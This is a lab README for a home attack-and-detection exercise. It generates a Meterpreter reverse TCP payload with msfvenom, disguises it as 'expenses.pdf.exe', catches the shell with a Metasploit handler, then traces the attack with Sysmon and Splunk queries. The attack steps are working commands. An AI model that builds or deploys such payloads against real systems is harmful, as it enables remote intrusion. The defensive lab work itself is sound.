# Attack and Dectection Lab: Meterpreter Reverse TCP Payload

## Project Overview
This project simulates an attack using the `meterpreter_reverse_tcp` payload generated by `msfvenom`.
The objective of this project is to compromise a Windows 10 machine and detect the attack using Sysmon and Splunk

## Tools used
- Kali Linux (attacker machine)
- Windows 10 (victim machine)
- Splunk
- Sysmon

## Attack Simulation
Payload: `windows/meterpreter/reverse_tcp` \
Tools used: Metasploit framework (`msfvenom`, `msfconsole`)

### Steps taken:
1. Find an open port using nmap -A -Pn <Victim IP address>
2. Generate the payload using:
`msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<host IP address> lport=<host unused port>
 -f exe -o expenses.pdf.exe`
3. Deliver the payload to the victim machine
4. Establish a Meterpreter session via msfconsole
   To receive the reverse shell, Metasplit's `exploit/multi/handler` module was used to be a listener and capture a connection from the malicious payload
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost <attacker IP address>
   set lport <open port used in (2)>
   exploit
   ```

## Detection
Using EventCode=3 detected a unusual network connection from `<attacker IP address>` to port `<3389> (RDP)`. \
Looking at more log evidence using the query of: \
 `index=sysmon EventCode=3 <attacker IP address>` \
A log entry is found where: \
`DestinationIp: <attacker IP address>`\
`sourceIp: <victim IP address>`\
`Image: C:\Users\<User>\Downloads\expenses.pdf.exe`\
Thus indicating a network connection initiated by an unusual executable file from the victim machine which is a strong indicator of a reverse shell or command and control channel\
Using the query of : `index=sysmon EventCode=1 expenses.pdf.exe a Log indicating cmd.exe was ccreated from the parent process of `expenses.pdf.exe`\
using the process_guid it is discovered that this process executed commands such as whoami, ipconfig, net localgroup, net user
